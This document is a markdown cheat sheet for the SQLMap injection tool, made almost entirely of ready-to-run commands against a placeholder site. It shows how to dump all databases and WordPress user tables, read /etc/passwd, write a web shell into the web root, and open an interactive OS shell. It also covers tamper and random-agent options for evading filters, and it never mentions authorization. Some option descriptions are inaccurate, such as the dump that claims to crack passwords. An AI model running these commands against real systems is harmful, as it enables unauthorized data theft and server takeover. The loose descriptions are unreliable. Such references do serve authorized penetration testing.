# 💉 SQLMap - SQL Injection Tool Complete Cheat Sheet

> **Comprehensive Guide to SQLMap for SQL Injection Testing**

## Table of Contents
1. [Installation](#installation)
2. [Basics](#basics)
3. [Target Specification](#target-specification)
4. [Detection & Enumeration](#detection--enumeration)
5. [Database Extraction](#database-extraction)
6. [OS Access](#os-access)
7. [Advanced Techniques](#advanced-techniques)
8. [Optimization](#optimization)

---

## Installation

```bash
# Linux
sudo apt-get install sqlmap
# Or
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap && python3 sqlmap.py -h

# Windows
# Download from https://sqlmap.org
```

---

## Basics

### Simple Scan

```bash
# Basic URL scanning
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# From file
sqlmap -r request.txt

# From Burp
sqlmap -l burp.log
```

### Common Options

```bash
# Verbose
sqlmap -u "http://target.com/page.php?id=1" -v 3

# Batch mode (auto-yes)
sqlmap -u "http://target.com/page.php?id=1" --batch

# Specify parameter
sqlmap -u "http://target.com/page.php?id=1" -p id

# Custom headers
sqlmap -u "http://target.com/page.php?id=1" -H "User-Agent: Custom"

# Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"
```

---

## Target Specification

```bash
# Single URL
sqlmap -u "http://target.com/page.php?id=1"

# Multiple parameters
sqlmap -u "http://target.com/page.php?id=1&name=admin"

# All parameters
sqlmap -u "http://target.com/page.php?id=1&name=admin" -p "*"

# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"

# PUT/DELETE/etc
sqlmap -u "http://target.com/api/user/1" --method=PUT --data="name=admin"

# From file
sqlmap -r request.txt

# Burp log
sqlmap -l burp.log -o
```

---

## Detection & Enumeration

### Database Detection

```bash
# Detect DBMS
sqlmap -u "http://target.com/page.php?id=1"

# Fingerprint
sqlmap -u "http://target.com/page.php?id=1" --fingerprint

# List databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Current user
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Is DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba
```

### Table Enumeration

```bash
# List tables
sqlmap -u "http://target.com/page.php?id=1" --tables

# List tables in specific database
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# List columns
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --columns

# Dump table
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Dump specific column
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump
```

---

## Database Extraction

```bash
# Dump all databases
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Dump specific database
sqlmap -u "http://target.com/page.php?id=1" -D wordpress --dump

# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D wordpress -T wp_users --dump

# Dump and crack passwords
sqlmap -u "http://target.com/page.php?id=1" -D wordpress -T wp_users --dump --batch

# Output to file
sqlmap -u "http://target.com/page.php?id=1" --dump -o output.txt

# CSV output
sqlmap -u "http://target.com/page.php?id=1" --dump --csv-del=',' -o output.csv
```

---

## OS Access

```bash
# File reading
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Command execution
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Interactive shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Privileges escalation
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Registry manipulation (Windows)
sqlmap -u "http://target.com/page.php?id=1" --reg-read
```

---

## Advanced Techniques

```bash
# Time-based blind
sqlmap -u "http://target.com/page.php?id=1" --technique=T

# Boolean-based blind
sqlmap -u "http://target.com/page.php?id=1" --technique=B

# Error-based
sqlmap -u "http://target.com/page.php?id=1" --technique=E

# Union-based
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# All techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ

# Custom injection point
sqlmap -u "http://target.com/page.php?id=1*"

# Tamper scripts (obfuscation)
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between

# Random agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

---

## Optimization

```bash
# Threads
sqlmap -u "http://target.com/page.php?id=1" --threads=10

# Timeout
sqlmap -u "http://target.com/page.php?id=1" --timeout=30

# Retries
sqlmap -u "http://target.com/page.php?id=1" --retries=3

# Risk level (1-3)
sqlmap -u "http://target.com/page.php?id=1" --risk=1

# Detection level (1-5)
sqlmap -u "http://target.com/page.php?id=1" --level=1

# Fast
sqlmap -u "http://target.com/page.php?id=1" --fast

# Batch (auto-yes)
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## Quick Reference

```bash
# Simple test
sqlmap -u "http://target.com/?id=1"

# Dump database
sqlmap -u "http://target.com/?id=1" --dbs --dump-all

# Read file
sqlmap -u "http://target.com/?id=1" --file-read=/etc/passwd

# OS shell
sqlmap -u "http://target.com/?id=1" --os-shell

# From request file
sqlmap -r request.txt --batch

# Specify DBMS
sqlmap -u "http://target.com/?id=1" --dbms=MySQL

# Specific parameter
sqlmap -u "http://target.com/?id=1&name=admin" -p name

# With cookie
sqlmap -u "http://target.com/?id=1" --cookie="session=abc"
```

---

## Workflows

### Complete Database Extraction

```bash
# 1. Test vulnerability
sqlmap -u "http://target.com/?id=1"

# 2. List databases
sqlmap -u "http://target.com/?id=1" --dbs

# 3. Dump specific database
sqlmap -u "http://target.com/?id=1" -D database_name --dump

# 4. Crack hashes
# Use john or hashcat
```

### Blind SQL Injection

```bash
# 1. Detect blind injection
sqlmap -u "http://target.com/?id=1" -v 3

# 2. Use time-based
sqlmap -u "http://target.com/?id=1" --technique=T

# 3. Extract data
sqlmap -u "http://target.com/?id=1" --dbs --technique=T
```

---

## Resources

- [SQLMap Official](http://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [Usage Tips](http://sqlmap.org/faq/)

---

© 2026 | SQLMap Cheat Sheet | Educational Purpose
